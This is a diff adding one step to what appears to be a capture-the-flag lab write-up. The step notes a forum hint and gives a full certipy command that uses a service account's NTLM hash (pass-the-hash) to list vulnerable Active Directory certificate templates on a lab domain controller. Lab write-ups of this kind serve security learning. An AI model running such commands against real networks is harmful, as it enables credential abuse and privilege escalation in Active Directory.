@@ -62,7 +62,9 @@
 
 ![image](https://github.com/user-attachments/assets/55e2e59e-2f73-4870-a387-3dfd2e37a651)
 
-10. 
+10. To be comletely honest, got a bit of a nudge from the official forum and ran certipy to find vulnerable templates
+	```certipy find -u management_svc -hashes :a091c1832bcdd4677c28b5a6a1295584 -dc-ip 10.129.131.108 -vulnerable -enabled```
+
 
 
  
